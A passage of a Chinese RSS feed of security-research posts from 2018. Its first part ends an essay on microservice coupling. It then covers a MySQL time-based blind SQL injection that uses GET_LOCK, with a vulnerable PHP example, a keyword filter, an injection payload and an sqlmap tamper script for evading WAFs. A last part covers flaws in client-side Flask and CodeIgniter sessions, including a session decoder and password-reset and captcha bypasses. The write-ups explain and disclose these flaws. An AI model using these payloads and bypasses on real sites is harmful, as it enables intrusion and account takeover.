需要思考的问题，并不只是学习新技术，采用新特性。&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&quot;&gt;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;所以我管这个叫作“诱惑”，反而，越是对技术追求越多越是容易受到 Over-designed 的影响。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 Service-Oriented Architecture vs 耦合痛点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;耦合这个词伴随我第一次程序设计课程一直到现在，从微观代码的类之间的耦合一直到服务之间耦合，设计上的耦合，甚至配置之间的耦合，一步一步走来；从思考中，也有了很多解决方法，不管有没有付诸实现，我觉得这些都是很有价值的值得讨论的问题。&lt;/p&gt;&lt;p&gt;本文描述的场景是结合上一篇文章使用了消息队列作为通信基础服务，服务之间通信需要通过消息队列。因此，基本上所有的服务之间的耦合应该是必须有通信协议耦合的，这是必须的，我们在这个 Topic 中讨论其他的问题：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;不能在数据模型上耦合&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;A：“我负责的这个服务的数据怎么传给你呢？”&lt;br&gt;B：“要不我把 Postgres 的端口暴露出来，你直接写到数据库吧”&lt;br&gt;A：“Models 就看 Git 上我的代码，COPY 到你那里就可以”&lt;br&gt;完成之后，过了几天，因为需求变动，数据模型需要修改……&lt;br&gt;B：“我需要改 Models，你那里可能也需要改改代码”&lt;br&gt;A：“…猫猫碰.jpg”&lt;br&gt;B：“我的 Migration 怎么老有问题？是不是 A 动了 Models？”&lt;br&gt;A：“..不，我没有，别瞎说啊.jpg”&lt;/blockquote&gt;&lt;p&gt;这样的对话，确确实实是现实中发生的，这个数据模型牵扯到了两个不同的服务在开发过程中，定义的修改，Feature 和需求的增加，都会导致直接的与这个模型相关联的服务的代码的改动；造成这样的问题只是起初为了方便两个服务之间传输数据。&lt;/p&gt;&lt;p&gt;那么既然已经有了通信系统，为什么不能用来定义通信协议来传输数据呢，维护一套耦合方式总要比同时兼顾通信协议和数据库更轻松吧。另外在数据库耦合会造成更多奇奇怪怪的问题，比如：一方使用 ORM 一方没有使用 ORM，或者双方 ORM 对数据库不同的操作导致冲突，甚至说任意一个服务在数据库操作上的小问题都会影响到其他服务。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;配置中心的必要性&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;A：“需要测试环境改点配置，我们的 MQ 服务器迁移了”&lt;br&gt;B：“那么几个节点的配置可能都需要改动之后重新启动”&lt;br&gt;A：“Orz……求一发批量操作脚本”&lt;/blockquote&gt;&lt;p&gt;我想不只是我们，可能所有的项目都会遇到这种问题，内网一个服务的迁移直接导致了大批配置文件需要改动；某一项配置的改动，需要牵连一大批配置文件内容的修改。&lt;/p&gt;&lt;p&gt;当然，IP 迁移的问题相对来说还是比较好解决的，只需要内网 DNS 可以解析到新迁移的机器上就可以了；但是某一项配置的改动导致的关联问题，可并不是那么容易能解决的。&lt;/p&gt;&lt;p&gt;当然也并不是没有办法解决：配置中心和正确的配置中心客户端就可以解决这种问题。（如果你的配置中心也要迁移，那就爱莫能助了吧）&lt;/p&gt;&lt;p&gt;配置中心其实也并不只是可以用来关系配置，服务的注册，自动发现，甚至一些服务基础信息的同步，集群管理都可以通过配置中心来做。在实践中，Etcd 和 Zookeeper 应用的相对比较多，以 Zookeeper 为例，在我个人的使用中其实无所谓你本身应用服务究竟是什么语言编写，Zookeeper 客户端一般都有相应的语言绑定，在 acl 和 ZK 配置得当的情况下，完全可以做到保持配置文件或者关键数据在分布式系统中的一致性，热更新，热迁移，并且保证一定的安全性。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;公共代码的耦合与 Infrastructure&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了上面提到的更多的上层的耦合的问题，在大型项目中代码的耦合问题虽然更不引人注意，但是可能存在的隐患依然是充满威胁。最具有代表性的例子其实就是一些基础设施公用库的问题，这些封装成了公共库的代码其实也是在迭代更新的，因此，如果说因为某一个服务的特殊需求导致公用代码的接口变动，可能会导致其他服务使用公用库的代码也要发生变动。&lt;/p&gt;&lt;p&gt;但是也并不意味着这样的问题是难以避免的，就公用代码而言，要避免这种尴尬的问题，比较好的方式其实是锁版本。没错，内部公用的代码库的发布也应该是有版本的，在一个服务 Stable 的时候，他的使用的公用代码库和基础设施的库一样都是锁定版本，避免因为公用代码的更新导致服务出现异常。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 Outro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然在实际的项目中，遇到的问题并不只这么多。在本文我只是特意选择了三个很具有代表性的方面来发表一些自己拙劣的见解，希望可以抛砖引玉，引来大佬一起交流 ;-)&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-04-16-35751510</guid>
<pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>一种新型SQL时间盲注攻击探索</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-03-35245598.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35245598&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0cd460758b08a7f1950d7ee754c468f5_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/879a0dd1ccf71649de0eeb3327f42f59&quot; data-hash=&quot;879a0dd1ccf71649de0eeb3327f42f59&quot; data-hovercard=&quot;p$b$879a0dd1ccf71649de0eeb3327f42f59&quot;&gt;@do9gy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;现就职于长亭科技，长期从事渗透测试，WAF攻防对抗工作，喜欢小狗。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;SQL注入漏洞由来已久，关于盲注方面一直都是安全爱好者喜欢研究的话题。记得最早了解到DNS外传的思路是在oldjun的博客，当时被这种技巧所吸引，不过该方法依赖于mysql版本和window环境的限制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;首先介绍一下什么是SQL盲注&lt;/h2&gt;&lt;blockquote&gt;在SQL注入中，往往需要引入“超出预期”的SQL语句，最好是希望将“额外”的查询内容直接显示在页面上，使用的手法有：“报错查询（error-based）”、“联合查询（union-select）”。对于无法直接回显出内容的情况需要依赖true／false差异判断（boolean）、时间对比（time-based）、DNS外传数据查询（data exfiltration through DNS channel）等方法进行捕获。例如：“select if(user()=&#39;root@localhost&#39;,sleep(4),null)“ 当网站用户是”root@localhost“时，会延长4秒钟后返回结果，当用户不是”root@localhost“时，会立即返回，由此可以判断系统中的用户，利用同样的方法可以猜测出权限范围内所有数据库所有表中存放的内容。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;关于mysql时间类型（time-based）的注入，一直以来众所周知的有三种方法——sleep、benchmark、笛卡尔积。所以许多市面上的WAF产品也是基于此类规则去防护的。&lt;/p&gt;&lt;p&gt;但是sql时间类型的盲注本质是&lt;b&gt;利用插入的SQL语句执行造成时间延迟&lt;/b&gt;，所以只要可以大于平均网络延迟2倍以上，就可以作为执行成功的判断依据，而大多数网站的平均响应时间在100ms以内，所以我们需要制造能达到200ms以上的时间延长的语句。&lt;/p&gt;&lt;p&gt;今天我们要提到的一个mysql函数是 get_lock函数，先来看一下mysql文档中对其的描述：&lt;/p&gt;&lt;p&gt;GET_LOCK(str,timeout)&lt;/p&gt;&lt;p&gt;Tries&lt;br&gt;to obtain a lock with a name given by the string str, using a timeout of&lt;br&gt;timeout seconds. A negative timeout value means infinite timeout. The lock is&lt;br&gt;exclusive. While held by one session, other sessions cannot obtain a lock of&lt;br&gt;the same name.&lt;/p&gt;&lt;p&gt;在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;然后通过另一个session 再次执行get_lock函数 select get_lock(‘do9gy’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; select get_lock(&#39;do9gy&#39;,1);
+---------------------+
| get_lock(&#39;do9gy&#39;,1) |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select get_lock(&#39;do9gy&#39;,5);
+---------------------+
| get_lock(&#39;do9gy&#39;,5) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (5.00 sec)
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;于是我们可以，将此方法用于SQL注入的判断，但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。&lt;/p&gt;&lt;p&gt;下面我们给出一个示例：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
require &#39;conn.php&#39;;
$id = $_GET[&#39;id&#39;];
if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|load_file|join)/i&quot;, $_GET[&#39;id&#39;]))
{
    die(&quot;403 forbidden!&quot;);
}
$sql = &quot;select * from article where id=&#39;&quot;.intval($id).&quot;&#39;&quot;;
$res = mysql_query($sql);
if(!$res){
    die(&quot;404 not found!&quot;);
}
$row = mysql_fetch_array($res, MYSQL_ASSOC);
print_r($row);
mysql_query(&quot;update view set view_times=view_times+1 where id = &#39;&quot;.$id.&quot; &#39;&quot;);
?&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;该案例中，我们可以构造SQL语句 ?id=1&lt;br&gt;and get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;注意：由于get_lock需要变换session请求，所以当执行完第一次以后需要停滞一段时间（半分钟左右），让Apache重新打开一个连接mysql的s&lt;/p&gt;&lt;p&gt;ession，此时就可以利用get_lock进行探测了。这里给出一个基于sqlmap的tamper：&lt;/p&gt;&lt;p&gt;&lt;b&gt;sleeptogetlock.py&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file &#39;doc/COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces instances like &#39;SLEEP(A)&#39; with &quot;get_lock(&#39;do9gy&#39;,A)&quot;

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0 and 5.5

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the SLEEP() and BENCHMARK() functions

    &amp;gt;&amp;gt;&amp;gt; tamper(&#39;SLEEP(2)&#39;)
    &quot;get_lock(&#39;do9gy&#39;,2)&quot;
    &quot;&quot;&quot;

    if payload and payload.find(&quot;SLEEP&quot;) &amp;gt; -1:
        while payload.find(&quot;SLEEP(&quot;) &amp;gt; -1:
            index = payload.find(&quot;SLEEP(&quot;)
            depth = 1
            
            num = payload[index+6]

            
            newVal = &quot;get_lock(&#39;do9gy&#39;,%s)&quot; % (num)
            payload = payload[:index] + newVal + payload[index+8:]


    return payload
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当遇到网站过滤单引号的情况也可以使用 get_lock(1,1) 锁定数字变量绕过。&lt;/p&gt;&lt;p&gt;最后，想声明的是本方法只是笔者依据时间注入本质原理进行的一次探索，现实环境中不一定有大量合适的环境，最重要的是保持一颗不断突破瓶颈，抱有幻想和希望的心。如有不实之处还望诸君斧正。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-04-03-35245598</guid>
<pubDate>Tue, 03 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>客户端 session 导致的安全问题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-26-34936378.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34936378&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-21b43848c8b14cf9e50e965b48ef5281_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在Web中，session是认证用户身份的凭证，它具备如下几个特点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;用户不可以任意篡改&lt;/li&gt;&lt;li&gt;A用户的session无法被B用户获取&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。&lt;/p&gt;&lt;h2&gt;0x01 什么是客户端session&lt;/h2&gt;&lt;p&gt;在传统PHP开发中，&lt;code class=&quot;inline&quot;&gt;$_SESSION&lt;/code&gt;变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。&lt;/p&gt;&lt;p&gt;然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。&lt;/p&gt;&lt;p&gt;因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。&lt;/p&gt;&lt;h2&gt;0x02 保护客户端session&lt;/h2&gt;&lt;p&gt;将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。&lt;/p&gt;&lt;p&gt;我们看看flask是如何处理的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SecureCookieSessionInterface(SessionInterface):
    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies
    through the :mod:`itsdangerous` module.
    &quot;&quot;&quot;
    #: the salt that should be applied on top of the secret key for the
    #: signing of cookie based sessions.
    salt = &#39;cookie-session&#39;
    #: the hash function to use for the signature. The default is sha1
    digest_method = staticmethod(hashlib.sha1)
    #: the name of the itsdangerous supported key derivation. The default
    #: is hmac.
    key_derivation = &#39;hmac&#39;
    #: A python serializer for the payload. The default is a compact
    #: JSON derived serializer with support for some extra Python types
    #: such as datetime objects or tuples.
    serializer = session_json_serializer
    session_class = SecureCookieSession

    def get_signing_serializer(self, app):
        if not app.secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

    def open_session(self, app, request):
        s = self.get_signing_serializer(app)
        if s is None:
            return None
        val = request.cookies.get(app.session_cookie_name)
        if not val:
            return self.session_class()
        max_age = total_seconds(app.permanent_session_lifetime)
        try:
            data = s.loads(val, max_age=max_age)
            return self.session_class(data)
        except BadSignature:
            return self.session_class()

    def save_session(self, app, session, response):
        domain = self.get_cookie_domain(app)
        path = self.get_cookie_path(app)
        # Delete case. If there is no session we bail early.
        # If the session was modified to be empty we remove the
        # whole cookie.
        if not session:
            if session.modified:
                response.delete_cookie(app.session_cookie_name,
                                       domain=domain, path=path)
            return
        # Modification case. There are upsides and downsides to
        # emitting a set-cookie header each request. The behavior
        # is controlled by the :meth:`should_set_cookie` method
        # which performs a quick check to figure out if the cookie
        # should be set or not. This is controlled by the
        # SESSION_REFRESH_EACH_REQUEST config flag as well as
        # the permanent flag on the session itself.
        if not self.should_set_cookie(app, session):
            return
        httponly = self.get_cookie_httponly(app)
        secure = self.get_cookie_secure(app)
        expires = self.get_expiration_time(app, session)
        val = self.get_signing_serializer(app).dumps(dict(session))
        response.set_cookie(app.session_cookie_name, val,
                            expires=expires, httponly=httponly,
                            domain=domain, path=path, secure=secure)&lt;/code&gt;&lt;p&gt;主要看最后两行代码，新建了&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;类 ，用它的&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;方法将类型为字典的session对象序列化成字符串，然后用&lt;code class=&quot;inline&quot;&gt;response.set_cookie&lt;/code&gt;将最后的内容保存在cookie中。&lt;/p&gt;&lt;p&gt;那么我们可以看一下&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;是做什么的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class Signer(object):
    # …
    def sign(self, value):
        &quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;
        return value + want_bytes(self.sep) + self.get_signature(value)

    def get_signature(self, value):
        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)


class Serializer(object):
    default_serializer = json
    default_signer = Signer
    # ….
    def dumps(self, obj, salt=None):
        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.
        The return value can be either a byte or unicode string depending
        on the format of the internal serializer.
        &quot;&quot;&quot;
        payload = want_bytes(self.dump_payload(obj))
        rv = self.make_signer(salt).sign(payload)
        if self.is_text_serializer:
            rv = rv.decode(&#39;utf-8&#39;)
        return rv

    def dump_payload(self, obj):
        &quot;&quot;&quot;Dumps the encoded object. The return value is always a
        bytestring. If the internal serializer is text based the value
        will automatically be encoded to utf-8.
        &quot;&quot;&quot;
        return want_bytes(self.serializer.dumps(obj))


class URLSafeSerializerMixin(object):
    &quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress
    the string to make it shorter if necessary. It will also base64 encode
    the string so that it can safely be placed in a URL.
    &quot;&quot;&quot;
    def load_payload(self, payload):
        decompress = False
        if payload.startswith(b&#39;.&#39;):
            payload = payload[1:]
            decompress = True
        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload(&#39;Could not base64 decode the payload because of &#39;
                &#39;an exception&#39;, original_error=e)
        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload(&#39;Could not zlib decompress the payload before &#39;
                    &#39;decoding the payload&#39;, original_error=e)
        return super(URLSafeSerializerMixin, self).load_payload(json)

    def dump_payload(self, obj):
        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
        is_compressed = False
        compressed = zlib.compress(json)
        if len(compressed) &amp;lt; (len(json) - 1):
            json = compressed
            is_compressed = True
        base64d = base64_encode(json)
        if is_compressed:
            base64d = b&#39;.&#39; + base64d
        return base64d


class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
    &quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL
    safe string consisting of the upper and lowercase character of the
    alphabet as well as ``&#39;_&#39;``, ``&#39;-&#39;`` and ``&#39;.&#39;``.
    &quot;&quot;&quot;
    default_serializer = compact_json&lt;/code&gt;&lt;p&gt;主要关注&lt;code class=&quot;inline&quot;&gt;dump_payload&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;，这是序列化session的主要过程。&lt;/p&gt;&lt;p&gt;可见，序列化的操作分如下几步：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;json.dumps 将对象转换成json字符串，作为数据&lt;/li&gt;&lt;li&gt;如果数据压缩后长度更短，则用zlib库进行压缩&lt;/li&gt;&lt;li&gt;将数据用base64编码&lt;/li&gt;&lt;li&gt;通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。&lt;/p&gt;&lt;p&gt;最后，我们在cookie中就能看到设置好的session了：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-310bda7796d4d07ae78abb4813d76b6a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;295&quot;&gt;&lt;p&gt;注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。&lt;/p&gt;&lt;h2&gt;0x03 flask客户端session导致敏感信息泄露&lt;/h2&gt;&lt;p&gt;我曾遇到过一个案例，目标是flask开发的一个简历管理系统，在测试其找回密码功能的时候，我收到了服务端设置的session。&lt;/p&gt;&lt;p&gt;我在0x02中说过，flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。编写如下代码解密session：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b&#39;.&#39;, 1)
    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)

    decompress = False
    if payload.startswith(b&#39;.&#39;):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(&#39;Could not base64 decode the payload because of &#39;
                         &#39;an exception&#39;)

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(&#39;Could not zlib decompress the payload before &#39;
                             &#39;decoding the payload&#39;)

    return session_json_serializer.loads(payload)

if __name__ == &#39;__main__&#39;:
    print(decryption(sys.argv[1].encode()))&lt;/code&gt;&lt;p&gt;例如，我解密0x02中演示的session：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-429c5066ae1eecc810a94c75d231d665_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;723&quot; data-rawheight=&quot;41&quot;&gt;&lt;p&gt;通过解密目标站点的session，我发现其设置了一个名为token、值是一串md5的键。猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。通过这个过程，我就能修改任意用户密码了。&lt;/p&gt;&lt;p&gt;这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。但因为flask的session是存储在cookie中且仅签名而未加密，所以我们就可以直接读取这个token了。&lt;/p&gt;&lt;h2&gt;0x04 flask验证码绕过漏洞&lt;/h2&gt;&lt;p&gt;这是客户端session的另一个常见漏洞场景。&lt;/p&gt;&lt;p&gt;我们用一个实际例子认识这一点：&lt;a href=&quot;https://github.com/shonenada/flask-captcha&quot;&gt;https://github.com/shonenada/flask-captcha&lt;/a&gt; 。这是一个为flask提供验证码的项目，我们看到其中的view文件：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import random
try:
    from cStringIO import StringIO
except ImportError:
    from io import BytesIO as StringIO

from flask import Blueprint, make_response, current_app, session
from wheezy.captcha.image import captcha
from wheezy.captcha.image import background
from wheezy.captcha.image import curve
from wheezy.captcha.image import noise
from wheezy.captcha.image import smooth
from wheezy.captcha.image import text
from wheezy.captcha.image import offset
from wheezy.captcha.image import rotate
from wheezy.captcha.image import warp


captcha_bp = Blueprint(&#39;captcha&#39;, __name__)


def sample_chars():
    characters = current_app.config[&#39;CAPTCHA_CHARACTERS&#39;]
    char_length = current_app.config[&#39;CAPTCHA_CHARS_LENGTH&#39;]
    captcha_code = random.sample(characters, char_length)
    return captcha_code

@captcha_bp.route(&#39;/captcha&#39;, endpoint=&quot;captcha&quot;)
def captcha_view():
    out = StringIO()
    captcha_image = captcha(drawings=[
        background(),
        text(fonts=current_app.config[&#39;CAPTCHA_FONTS&#39;],
             drawings=[warp(), rotate(), offset()]),
        curve(),
        noise(),
        smooth(),
    ])
    captcha_code = &#39;&#39;.join(sample_chars())
    imgfile = captcha_image(captcha_code)
    session[&#39;captcha&#39;] = captcha_code
    imgfile.save(out, &#39;PNG&#39;)
    out.seek(0)
    response = make_response(out.read())
    response.content_type = &#39;image/png&#39;
    return response&lt;/code&gt;&lt;p&gt;可见，其生成验证码后，就存储在session中了：&lt;code class=&quot;inline&quot;&gt;session[&#39;captcha&#39;] = captcha_code&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;我们用浏览器访问&lt;code class=&quot;inline&quot;&gt;/captcha&lt;/code&gt;，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b6399058172ffe4b393e6da2df5bb9bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1496&quot; data-rawheight=&quot;697&quot;&gt;&lt;p&gt;可见，我成功获取了验证码的值，进而可以绕过验证码的判断。&lt;/p&gt;&lt;p&gt;这也是客户端session的一种错误使用方法。&lt;/p&gt;&lt;h2&gt;0x05 CodeIgniter 2.1.4 session伪造及对象注入漏洞&lt;/h2&gt;&lt;p&gt;Codeigniter 2的session也储存在session中，默认名为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;，默认值如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e5edf0893d4da488de1ace08380c8635_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1484&quot; data-rawheight=&quot;655&quot;&gt;&lt;p&gt;可见，session数据被用PHP自带的serialize函数进行序列化，并签名后作为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;的值。原理上和flask如出一辙，我就不重述了。但好在codeigniter2支持对session进行加密，只需在配置文件中设置&lt;code class=&quot;inline&quot;&gt;$config[&#39;sess_encrypt_cookie&#39;] = TRUE;&lt;/code&gt;即可。&lt;/p&gt;&lt;p&gt;在CI2.1.4及以前的版本中，存在一个弱加密漏洞（ &lt;a href=&quot;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&quot;&gt;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&lt;/a&gt; ），如果目标环境中没有安装Mcrypt扩展，则CI会使用一个相对比较弱的加密方式来处理session:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function _xor_encode($string, $key)
{
 $rand = &#39;&#39;;
 while (strlen($rand) &amp;lt; 32)
 {
  $rand .= mt_rand(0, mt_getrandmax());
 }
 $rand = $this-&amp;gt;hash($rand);
 $enc = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
 }
 return $this-&amp;gt;_xor_merge($enc, $key);
}

function _xor_merge($string, $key)
{
 $hash = $this-&amp;gt;hash($key);
 $str = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
 }
 return $str;
}&lt;/code&gt;&lt;p&gt;其中用到了&lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt;、异或等存在大量缺陷的方法。我们通过几个简单的脚本（ &lt;a href=&quot;https://github.com/Dionach/CodeIgniterXor&quot;&gt;https://github.com/Dionach/CodeIgniterXor&lt;/a&gt; ），即可在4秒到4分钟的时间，破解CI2的密钥。&lt;/p&gt;&lt;p&gt;获取到了密钥，我们即可篡改任意session，并自己签名及加密，最后伪造任意用户，注入任意对象，甚至通过反序列化操作造成更大的危害。&lt;/p&gt;&lt;h2&gt;0x06 总结&lt;/h2&gt;&lt;p&gt;我以三个案例来说明了客户端session的安全问题。&lt;/p&gt;&lt;p&gt;上述三个问题，如果session是储存在服务器文件或数据库中，则不会出现。当然，考虑到flask和ci都是非常轻量的web框架，很可能运行在无法操作文件系统或没有数据库的服务器上，所以客户端session是无法避免的。&lt;/p&gt;&lt;p&gt;除此之外，我还能想到其他客户端session可能存在的安全隐患：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session&lt;/li&gt;&lt;li&gt;任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞（ &lt;a href=&quot;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&quot;&gt;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&lt;/a&gt; 